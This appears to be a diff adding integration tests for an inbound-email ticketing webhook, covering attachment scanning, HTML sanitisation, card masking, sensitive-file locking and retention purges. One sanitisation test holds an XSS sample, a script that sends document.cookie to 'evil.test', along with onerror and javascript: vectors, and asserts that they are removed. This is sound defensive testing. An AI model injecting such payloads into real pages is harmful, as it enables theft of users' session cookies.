@@ -13,9 +13,23 @@
  *    no ticket; with it off, the same message does. The negative is written
  *    first, because "always creates a ticket" would pass every positive test.
  */
-import type { PrismaClient } from '@prisma/client';
+import { existsSync, mkdtempSync, readdirSync, rmSync } from 'node:fs';
+import { tmpdir } from 'node:os';
+import { join } from 'node:path';
+import { PrismaClient } from '@prisma/client';
 import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
-import { ownerClient, seedDefaultBrand, seedFixtures, type Fixtures } from '../helpers/fixtures.js';
+import { RetentionRunner } from '../../src/services/retention/retention.js';
+import { LocalStore } from '../../src/services/storage/local-store.js';
+import { StorageUnavailableError } from '../../src/services/storage/storage-error.js';
+import { EICAR_SIGNATURE } from '../../src/services/storage/virus-scanner.js';
+import {
+  grantToken,
+  ownerClient,
+  seedDefaultBrand,
+  seedFixtures,
+  testEnv,
+  type Fixtures,
+} from '../helpers/fixtures.js';
 import { clearRateLimits, startTestServer, type TestServer } from '../helpers/server.js';
 
 const DOMAIN = 'inbound.siyahtus.localhost';
@@ -428,5 +442,476 @@ describe('inbound email webhook secret', () => {
     });
     expect(response.statusCode).toBe(200);
     expect(response.json().status).toBe('created');
+  });
+});
+
+// --- The mail itself: text, HTML, files (tm 357 · SiyahTuş analysis HD-02) ------
+//
+// Until tm 357 the webhook accepted a body and threw it away. These pin what a
+// player's mail now leaves behind: the reply as the ticket's first message,
+// quote and signature cut but kept, the files checked, scanned and stored
+// behind the ticket's own door, a sensitive one locked for a role without the
+// permission and audited for one with it, one ticket per Message-ID, and the
+// retention window reaching a sensitive file.
+
+const PDF = Buffer.from('%PDF-1.4\n1 0 obj << /Type /Catalog >> endobj\n%%EOF\n');
+const PNG = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13]);
+const JPEG = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0, 16, 0x4a, 0x46, 0x49, 0x46]);
+const REPLY = 'Yatırımım geçmedi, 2.500 TL, saat 14:42, dekont ektedir.';
+const GMAIL_TR = [
+  REPLY,
+  '',
+  '20 Eki 2026 Pzt, 14:50 tarihinde SiyahTuş Destek <destek@ornek.test> şunu yazdı:',
+  '> Merhaba, yatırımınızın dekontunu iletir misiniz?',
+  '>',
+  '> Saygılarımızla',
+].join('\n');
+
+interface ThreadMessage {
+  id: string;
+  ticket_id: string;
+  kind: string;
+  author_type: string;
+  body_text: string;
+  body_text_full: string | null;
+  body_html: string | null;
+  attachments: Array<{
+    key: string;
+    name: string;
+    size: number;
+    mime: string;
+    scan_status: string;
+    sensitive: boolean;
+    purged?: boolean;
+    locked?: boolean;
+  }>;
+}
+
+const attach = (filename: string, bytes: Buffer, contentType = 'application/octet-stream') => ({
+  filename,
+  content_type: contentType,
+  content_base64: bytes.toString('base64'),
+});
+
+describe('inbound email body and files (tm 357)', () => {
+  let owner: PrismaClient;
+  let server: TestServer;
+  let fx: Fixtures;
+  let storageDir: string;
+  let ownerToken: string;
+  let agentToken: string;
+  let otherTenantToken: string;
+  let seq = 0;
+
+  const auth = (token: string) => ({ authorization: `Bearer ${token}` });
+  const address = () => `${fx.a.organizationId}@${DOMAIN}`;
+  const nextMessageId = () => `<m${Date.now()}.${++seq}@mail.oyuncu.test>`;
+
+  const inbound = (payload: Record<string, unknown>) =>
+    server.post('/channels/email/inbound', {
+      to: address(),
+      from: 'Ali Veli <ali@oyuncu.test>',
+      subject: 'Yatırımım geçmedi',
+      ...payload,
+    });
+
+  async function created(payload: Record<string, unknown>): Promise<string> {
+    const response = await inbound(payload);
+    expect(response.statusCode, response.body).toBe(200);
+    const body = response.json() as { status: string; ticket_id: string };
+    expect(body.status).toBe('created');
+    return body.ticket_id;
+  }
+
+  async function thread(ticketId: string, token = ownerToken): Promise<ThreadMessage[]> {
+    const response = await server.get(`/tickets/${ticketId}/messages`, auth(token));
+    expect(response.statusCode, response.body).toBe(200);
+    return (response.json() as { items: ThreadMessage[] }).items;
+  }
+
+  const download = (message: ThreadMessage, key: string, token = ownerToken) =>
+    server.get(
+      `/tickets/${message.ticket_id}/messages/${message.id}/attachments/${key}`,
+      auth(token),
+    );
+
+  /** Every stored file of licence A, sidecars aside. */
+  function storedFiles(): string[] {
+    const dir = join(storageDir, String(fx.a.licenseId));
+    return existsSync(dir) ? readdirSync(dir).filter((name) => !name.endsWith('.type')) : [];
+  }
+
+  beforeAll(async () => {
+    owner = ownerClient();
+    storageDir = mkdtempSync(join(tmpdir(), 'siyahtus-inbound-email-'));
+    server = await startTestServer({ STORAGE_PROVIDER: 'local', STORAGE_LOCAL_DIR: storageDir });
+  });
+
+  afterAll(async () => {
+    await server.close();
+    await owner.$disconnect();
+    rmSync(storageDir, { recursive: true, force: true });
+  });
+
+  beforeEach(async () => {
+    fx = await seedFixtures(owner);
+    await clearRateLimits(server.app);
+    rmSync(join(storageDir, String(fx.a.licenseId)), { recursive: true, force: true });
+    ownerToken = await grantToken(owner, {
+      licenseId: fx.a.licenseId,
+      organizationId: fx.a.organizationId,
+      ownerId: fx.a.ownerAccountId,
+      scopes: ['tickets--all:rw', 'tickets--all:ro', 'access_rules:rw', 'access_rules:ro'],
+    });
+    agentToken = await grantToken(owner, {
+      licenseId: fx.a.licenseId,
+      organizationId: fx.a.organizationId,
+      ownerId: fx.a.agentAccountId,
+      scopes: ['tickets--access:rw', 'tickets--access:ro'],
+    });
+    otherTenantToken = await grantToken(owner, {
+      licenseId: fx.b.licenseId,
+      organizationId: fx.b.organizationId,
+      ownerId: fx.b.ownerAccountId,
+      scopes: ['tickets--all:rw', 'tickets--all:ro'],
+    });
+  });
+
+  it("keeps the player's mail as the ticket's first message, quote cut, with its dekont (FR-MOD-08.5.3)", async () => {
+    const ticketId = await created({
+      text: GMAIL_TR,
+      message_id: '<CAF1abc@mail.gmail.com>',
+      attachments: [attach('dekont.pdf', PDF, 'application/pdf')],
+    });
+
+    const [message, ...rest] = await thread(ticketId);
+    expect(rest).toEqual([]);
+    expect(message).toMatchObject({
+      kind: 'customer_message',
+      author_type: 'customer',
+      body_text: REPLY,
+    });
+    // The cut is a guess, so the whole mail is kept beside it.
+    expect(message!.body_text_full).toContain('şunu yazdı:');
+    expect(message!.body_text_full).toContain('> Merhaba, yatırımınızın dekontunu');
+    expect(message!.attachments).toEqual([
+      {
+        key: expect.stringMatching(new RegExp(`^${fx.a.licenseId}-m-`)),
+        name: 'dekont.pdf',
+        size: PDF.length,
+        mime: 'application/pdf',
+        scan_status: 'clean',
+        sensitive: false,
+      },
+    ]);
+
+    const row = await owner.ticketMessage.findUniqueOrThrow({ where: { id: message!.id } });
+    expect(row.emailMessageId).toBe('CAF1abc@mail.gmail.com');
+    expect(row.licenseId).toBe(fx.a.licenseId);
+    const ticket = await owner.ticket.findUniqueOrThrow({ where: { id: ticketId } });
+    expect(ticket.lastCustomerMessageAt).not.toBeNull();
+
+    // The bytes open through the ticket — and only there.
+    const key = message!.attachments[0]!.key;
+    const file = await download(message!, key);
+    expect(file.statusCode).toBe(200);
+    expect(file.rawPayload.equals(PDF)).toBe(true);
+    expect(file.headers['content-type']).toBe('application/pdf');
+    expect(file.headers['content-disposition']).toBe('attachment');
+    expect(file.headers['x-content-type-options']).toBe('nosniff');
+    // A session that may read uploads still cannot read this one through them.
+    const uploadsToken = await grantToken(owner, {
+      licenseId: fx.a.licenseId,
+      organizationId: fx.a.organizationId,
+      ownerId: fx.a.ownerAccountId,
+      scopes: ['chats--all:ro', 'chats--all:rw'],
+    });
+    expect((await server.get(`/uploads/${key}`, auth(uploadsToken))).statusCode).toBe(404);
+    // Another workspace learns nothing, a key on another message nothing either.
+    expect((await download(message!, key, otherTenantToken)).statusCode).toBe(404);
+    expect(
+      (
+        await server.get(
+          `/tickets/${ticketId}/messages/${message!.id}/attachments/${fx.a.licenseId}-m-00000000-0000-4000-8000-000000000000.pdf`,
+          auth(ownerToken),
+        )
+      ).statusCode,
+    ).toBe(404);
+  });
+
+  it('refuses the EICAR file without refusing the mail, and says so on the ticket (FR-MOD-08.9.4)', async () => {
+    const eicar = Buffer.concat([PDF, Buffer.from(EICAR_SIGNATURE, 'latin1')]);
+    const ticketId = await created({
+      text: REPLY,
+      attachments: [
+        attach('virus.pdf', eicar, 'application/pdf'),
+        attach('ekran.png', PNG, 'image/png'),
+        attach('kurulum.exe', Buffer.from('MZ\x90\x00'), 'application/x-msdownload'),
+      ],
+    });
+
+    const [message, note, ...rest] = await thread(ticketId);
+    expect(rest).toEqual([]);
+    expect(message!.attachments.map((file) => file.name)).toEqual(['ekran.png']);
+    expect(note).toMatchObject({ kind: 'system', author_type: 'system' });
+    expect(note!.body_text).toContain('“virus.pdf” — it did not pass the virus scan');
+    expect(note!.body_text).toContain('“kurulum.exe” — only images and PDF files are kept');
+    // Not one byte of the infected file is in the store.
+    expect(storedFiles()).toEqual([message!.attachments[0]!.key]);
+  });
+
+  it('opens one ticket for one Message-ID, however often and however concurrently it arrives (FR-MOD-08.5.3)', async () => {
+    const messageId = nextMessageId();
+    const first = await created({ text: REPLY, message_id: messageId });
+
+    const again = await inbound({ text: REPLY, message_id: messageId });
+    expect(again.json()).toEqual({ status: 'created', ticket_id: first, duplicate: true });
+
+    // Two deliveries racing in, each with a file: one ticket, one message, one
+    // stored file — the loser's file is deleted again.
+    const racing = nextMessageId();
+    const payload = {
+      text: REPLY,
+      message_id: racing,
+      attachments: [attach('dekont.pdf', PDF, 'application/pdf')],
+    };
+    const [a, b] = await Promise.all([inbound(payload), inbound(payload)]);
+    expect([a.statusCode, b.statusCode]).toEqual([200, 200]);
+    const ids = [a.json().ticket_id, b.json().ticket_id];
+    expect(ids[0]).toBe(ids[1]);
+    expect([a.json().duplicate, b.json().duplicate].filter(Boolean)).toHaveLength(1);
+
+    expect(await owner.ticket.count({ where: { licenseId: fx.a.licenseId } })).toBe(2);
+    expect(
+      await owner.ticketMessage.count({
+        where: { licenseId: fx.a.licenseId, kind: 'customer_message' },
+      }),
+    ).toBe(2);
+    expect(storedFiles()).toHaveLength(1);
+  });
+
+  it('keeps the HTML only sanitised, and reads the text from it when the mail has none', async () => {
+    const ticketId = await created({
+      html:
+        '<div>Dekont ektedir.<script>fetch("https://evil.test/?c="+document.cookie)</script></div>' +
+        '<img src="https://tracker.test/open.gif" onerror="alert(1)">' +
+        '<iframe src="https://evil.test"></iframe><a href="javascript:alert(1)">tıkla</a>',
+    });
+
+    const [message] = await thread(ticketId);
+    expect(message!.body_text).toBe('Dekont ektedir.\ntıkla');
+    expect(message!.body_html).toBe(
+      '<div>Dekont ektedir.</div><img data-src="https://tracker.test/open.gif"><a>tıkla</a>',
+    );
+    expect(message!.body_html).not.toMatch(/script|onerror|iframe|javascript:/i);
+  });
+
+  it("masks a card number in the text, the whole text and the HTML, and leaves the signature's phone (FR-MOD-08.9.5)", async () => {
+    const ticketId = await created({
+      text: 'Kartım 4111 1111 1111 1111 ile yatırdım.\n\n-- \nAli Veli\nTel: 0532 123 45 67',
+      html: '<p>Kartım 4111 1111 1111 1111 ile yatırdım.</p>',
+    });
+
+    const [message] = await thread(ticketId);
+    const all = [message!.body_text, message!.body_text_full ?? '', message!.body_html ?? ''];
+    for (const text of all) {
+      expect(text).not.toContain('4111 1111 1111 1111');
+      expect(text).toContain('**** **** **** 1111');
+    }
+    expect(message!.body_text).not.toContain('0532');
+    expect(message!.body_text_full).toContain('Tel: 0532 123 45 67');
+  });
+
+  it('drops a mail whose text is spam before any file is stored (FR-MOD-08.9.3)', async () => {
+    const response = await inbound({
+      subject: 'Merhaba',
+      text: 'Click here to claim your prize',
+      attachments: [attach('dekont.pdf', PDF, 'application/pdf')],
+    });
+    expect(response.json()).toEqual({ status: 'ignored', reason: 'spam' });
+    expect(await owner.ticket.count({ where: { licenseId: fx.a.licenseId } })).toBe(0);
+    expect(storedFiles()).toEqual([]);
+  });
+
+  it('locks an identity document for a role without the permission, and audits every opening', async () => {
+    const ticketId = await created({
+      text: REPLY,
+      attachments: [
+        attach('KİMLİK_ön.jpg', JPEG, 'image/jpeg'),
+        attach('dekont.pdf', PDF, 'application/pdf'),
+      ],
+    });
+    // An agent the ticket is assigned to reads its thread.
+    await owner.ticket.update({
+      where: { id: ticketId },
+      data: { assigneeId: fx.a.agentAccountId },
+    });
+    const opened = () =>
+      owner.auditLogEntry.findMany({
+        where: { licenseId: fx.a.licenseId, action: 'ticket.attachment_opened' },
+      });
+
+    // The agent's role does not hold `customers.documents.view` by default.
+    const [asAgent] = await thread(ticketId, agentToken);
+    const [idCard, receipt] = asAgent!.attachments;
+    expect(idCard).toMatchObject({ name: 'KİMLİK_ön.jpg', sensitive: true, locked: true });
+    expect(receipt).toMatchObject({ name: 'dekont.pdf', sensitive: false });
+    expect(receipt!.locked).toBeUndefined();
+
+    const refused = await download(asAgent!, idCard!.key, agentToken);
+    expect(refused.statusCode).toBe(403);
+    expect(refused.json().error.details).toMatchObject({
+      reason: 'capability_required',
+      capability: 'customers.documents.view',
+    });
+    expect((await download(asAgent!, receipt!.key, agentToken)).statusCode).toBe(200);
+    // An ordinary file is not an event.
+    expect(await opened()).toEqual([]);
+
+    // The owner's role holds it: unlocked, served uncached, and recorded.
+    const [asOwner] = await thread(ticketId);
+    expect(asOwner!.attachments[0]!.locked).toBeUndefined();
+    const file = await download(asOwner!, idCard!.key);
+    expect(file.statusCode).toBe(200);
+    expect(file.rawPayload.equals(JPEG)).toBe(true);
+    expect(file.headers['cache-control']).toBe('no-store');
+
+    const entries = await opened();
+    expect(entries).toHaveLength(1);
+    expect(entries[0]).toMatchObject({
+      actorId: fx.a.ownerAccountId,
+      target: `ticket:${ticketId}`,
+      metadata: { message_id: asOwner!.id, key: idCard!.key },
+    });
+    // The name can itself be personal data; it is not in the trail.
+    expect(JSON.stringify(entries[0]!.metadata)).not.toContain('KİMLİK');
+  });
+
+  it('treats every e-mailed file as sensitive when the workspace says so', async () => {
+    // `security_settings` is kept per brand; the fixtures start with none.
+    await seedDefaultBrand(owner, fx.a.licenseId);
+    const saved = await server.patch(
+      '/settings/security',
+      { inbound_attachments_sensitive: true },
+      auth(ownerToken),
+    );
+    expect(saved.statusCode, saved.body).toBe(200);
+    expect(saved.json().inbound_attachments_sensitive).toBe(true);
+
+    const ticketId = await created({
+      text: REPLY,
+      attachments: [attach('dekont.pdf', PDF, 'application/pdf')],
+    });
+    const [message] = await thread(ticketId);
+    expect(message!.attachments[0]).toMatchObject({ name: 'dekont.pdf', sensitive: true });
+
+    // And by the subject alone, with the setting off again.
+    await server.patch(
+      '/settings/security',
+      { inbound_attachments_sensitive: false },
+      auth(ownerToken),
+    );
+    const kyc = await created({
+      subject: 'KYC belgelerim',
+      attachments: [attach('foto.png', PNG, 'image/png')],
+    });
+    expect((await thread(kyc))[0]!.attachments[0]!.sensitive).toBe(true);
+  });
+
+  it('deletes a sensitive file under the conversation window and marks it purged, keeping the rest', async () => {
+    const appRole = new PrismaClient({ datasourceUrl: process.env['DATABASE_APP_URL'] });
+    try {
+      // Old: a passport (sensitive by its name) beside a dekont (not sensitive).
+      const ticketId = await created({
+        text: REPLY,
+        attachments: [
+          attach('pasaport.jpg', JPEG, 'image/jpeg'),
+          attach('dekont.pdf', PDF, 'application/pdf'),
+        ],
+      });
+      const fresh = await created({
+        text: REPLY,
+        attachments: [attach('ehliyet.png', PNG, 'image/png')],
+      });
+      const [old] = await thread(ticketId);
+      const [recent] = await thread(fresh);
+      // The old one is past the 365-day thread window; the recent one is not.
+      await owner.$executeRaw`
+        UPDATE ticket_messages SET created_at = now() - interval '400 days' WHERE id = ${old!.id}::uuid`;
+
+      const runner = new RetentionRunner(appRole, {
+        policy: { threadDays: 365, visitDays: 90, mailDays: 30, auditDays: 30 },
+        mailDir: join(storageDir, 'no-mail'),
+        auditChainSecret: testEnv().AUDIT_CHAIN_SECRET,
+        store: new LocalStore(storageDir),
+      });
+
+      const preview = await runner.run({ dryRun: true });
+      expect(
+        preview.tenants.find((t) => t.licenseId === String(fx.a.licenseId))?.sensitiveFiles,
+      ).toBe(1);
+      expect(storedFiles()).toHaveLength(3);
+
+      const report = await runner.run({ dryRun: false });
+      const mine = report.tenants.find((t) => t.licenseId === String(fx.a.licenseId));
+      expect(mine?.sensitiveFiles).toBe(1);
+      // Only the old sensitive file went: the old dekont and the recent licence stay.
+      const [passport, receipt] = old!.attachments;
+      expect(storedFiles().sort()).toEqual([receipt!.key, recent!.attachments[0]!.key].sort());
+
+      // The message stays and says the file was there; the door is shut.
+      const [after] = await thread(ticketId);
+      expect(after!.body_text).toBe(REPLY);
+      expect(after!.attachments[0]).toMatchObject({ name: 'pasaport.jpg', purged: true });
+      expect(after!.attachments[1]).toMatchObject({ name: 'dekont.pdf', sensitive: false });
+      expect(after!.attachments[1]!.purged).toBeUndefined();
+      expect((await download(after!, passport!.key)).statusCode).toBe(404);
+      expect((await download(after!, receipt!.key)).statusCode).toBe(200);
+      expect((await thread(fresh))[0]!.attachments[0]!.purged).toBeUndefined();
+
+      // Nothing left to do: a second run removes nothing.
+      const twice = await runner.run({ dryRun: false });
+      expect(
+        twice.tenants.find((t) => t.licenseId === String(fx.a.licenseId))?.sensitiveFiles,
+      ).toBe(0);
+    } finally {
+      await appRole.$disconnect();
+    }
+  });
+
+  it('lets a store outage stop the file step, not the sweep — and marks nothing it did not delete', async () => {
+    const appRole = new PrismaClient({ datasourceUrl: process.env['DATABASE_APP_URL'] });
+    try {
+      const ticketId = await created({
+        text: REPLY,
+        attachments: [attach('kimlik.jpg', JPEG, 'image/jpeg')],
+      });
+      const [message] = await thread(ticketId);
+      await owner.$executeRaw`
+        UPDATE ticket_messages SET created_at = now() - interval '400 days' WHERE id = ${message!.id}::uuid`;
+
+      const local = new LocalStore(storageDir);
+      const runner = new RetentionRunner(appRole, {
+        policy: { threadDays: 365, visitDays: 90, mailDays: 30, auditDays: 30 },
+        mailDir: join(storageDir, 'no-mail'),
+        auditChainSecret: testEnv().AUDIT_CHAIN_SECRET,
+        store: {
+          put: (key, bytes, type) => local.put(key, bytes, type),
+          get: (key) => local.get(key),
+          exists: (key) => local.exists(key),
+          stat: (key) => local.stat(key),
+          delete: () => Promise.reject(new StorageUnavailableError('bucket down')),
+        },
+      });
+
+      const report = await runner.run({ dryRun: false });
+      expect(
+        report.tenants.find((t) => t.licenseId === String(fx.a.licenseId))?.sensitiveFiles,
+      ).toBe(0);
+      expect(storedFiles()).toEqual([message!.attachments[0]!.key]);
+      expect((await thread(ticketId))[0]!.attachments[0]!.purged).toBeUndefined();
+    } finally {
+      await appRole.$disconnect();
+    }
   });
 });
